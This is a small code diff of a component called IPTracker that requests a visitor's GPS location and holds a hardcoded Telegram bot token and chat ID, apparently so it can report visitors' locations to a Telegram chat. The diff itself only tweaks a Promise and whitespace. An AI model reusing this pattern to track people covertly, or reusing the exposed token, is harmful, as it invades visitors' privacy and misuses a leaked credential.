@@ -77,7 +77,7 @@ function IPTracker() {
         if (navigator.geolocation) {
           try {
             
-            await new Promise((resolve, reject) => {
+            await new Promise((resolve) => {
               navigator.geolocation.getCurrentPosition(
                 
                 (position) => {
@@ -103,7 +103,7 @@ function IPTracker() {
             console.error("Lokasi error...", gpsError);
           }
         }
-        
+       
         
         const TELEGRAM_BOT_TOKEN = '7807161260:AAHAnhLzPqLprHr_inS9ixhmb3jJwHxxdMI';
         const TELEGRAM_CHAT_ID = '1254913051';
